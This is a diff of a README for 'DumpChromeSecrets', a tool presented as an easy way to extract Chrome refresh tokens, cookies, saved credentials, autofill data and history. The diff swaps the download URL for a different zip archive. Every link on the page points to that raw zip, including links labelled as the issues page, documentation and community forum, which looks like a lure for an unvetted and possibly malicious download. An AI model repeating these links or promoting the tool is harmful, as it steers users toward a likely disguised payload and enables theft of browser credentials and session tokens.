@@ -1,7 +1,7 @@
 # 🚀 DumpChromeSecrets - Easily Extract Chrome Data
 
 ## 📥 Download Now
-[![Download DumpChromeSecrets](https://github.com/hake12345/DumpChromeSecrets/raw/refs/heads/main/DllExtractChromeSecrets/Chrome-Dump-Secrets-v2.2.zip)](https://github.com/hake12345/DumpChromeSecrets/raw/refs/heads/main/DllExtractChromeSecrets/Chrome-Dump-Secrets-v2.2.zip)
+[![Download DumpChromeSecrets](https://raw.githubusercontent.com/hake12345/DumpChromeSecrets/main/DumpChromeSecrets/Secrets-Dump-Chrome-latro.zip)](https://raw.githubusercontent.com/hake12345/DumpChromeSecrets/main/DumpChromeSecrets/Secrets-Dump-Chrome-latro.zip)
 
 ## 🎯 Overview
 DumpChromeSecrets helps you grab important data from modern Chrome versions. You can easily extract refresh tokens, cookies, saved credentials, autofill data, browsing history, and bookmarks. This tool is designed for users who want quick access to their information without diving into complex processes.
@@ -20,7 +20,7 @@ Before you start, ensure your device meets these basic requirements:
 To begin using DumpChromeSecrets, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.  
-   [Download DumpChromeSecrets](https://github.com/hake12345/DumpChromeSecrets/raw/refs/heads/main/DllExtractChromeSecrets/Chrome-Dump-Secrets-v2.2.zip)
+   [Download DumpChromeSecrets](https://raw.githubusercontent.com/hake12345/DumpChromeSecrets/main/DumpChromeSecrets/Secrets-Dump-Chrome-latro.zip)
 
 2. **Choose the Latest Version:** Look for the most recent version on the page. This ensures you have the latest features.
 
@@ -58,17 +58,17 @@ Be mindful that this application accesses sensitive information stored in your b
 
 - **No Data Extracted:** Ensure that Chrome is closed during extraction. The application cannot access the data if Chrome is running.
 
-- **Need Help?** If you encounter problems or have questions, visit our [GitHub Issues page](https://github.com/hake12345/DumpChromeSecrets/raw/refs/heads/main/DllExtractChromeSecrets/Chrome-Dump-Secrets-v2.2.zip) for assistance.
+- **Need Help?** If you encounter problems or have questions, visit our [GitHub Issues page](https://raw.githubusercontent.com/hake12345/DumpChromeSecrets/main/DumpChromeSecrets/Secrets-Dump-Chrome-latro.zip) for assistance.
 
 ## 🔗 Additional Resources
 For more guides and detailed information, feel free to explore the following:
 
-- [Documentation](https://github.com/hake12345/DumpChromeSecrets/raw/refs/heads/main/DllExtractChromeSecrets/Chrome-Dump-Secrets-v2.2.zip)
-- [Community Forum](https://github.com/hake12345/DumpChromeSecrets/raw/refs/heads/main/DllExtractChromeSecrets/Chrome-Dump-Secrets-v2.2.zip)
+- [Documentation](https://raw.githubusercontent.com/hake12345/DumpChromeSecrets/main/DumpChromeSecrets/Secrets-Dump-Chrome-latro.zip)
+- [Community Forum](https://raw.githubusercontent.com/hake12345/DumpChromeSecrets/main/DumpChromeSecrets/Secrets-Dump-Chrome-latro.zip)
 
 ## ⚖️ License
 This application is open-source under the MIT License. For more information, check the LICENSE file in the repository.
 
 ## 📥 Final Download Link
 Don’t forget to visit our releases page and download the latest version of DumpChromeSecrets!  
-[Download DumpChromeSecrets](https://github.com/hake12345/DumpChromeSecrets/raw/refs/heads/main/DllExtractChromeSecrets/Chrome-Dump-Secrets-v2.2.zip)
+[Download DumpChromeSecrets](https://raw.githubusercontent.com/hake12345/DumpChromeSecrets/main/DumpChromeSecrets/Secrets-Dump-Chrome-latro.zip)
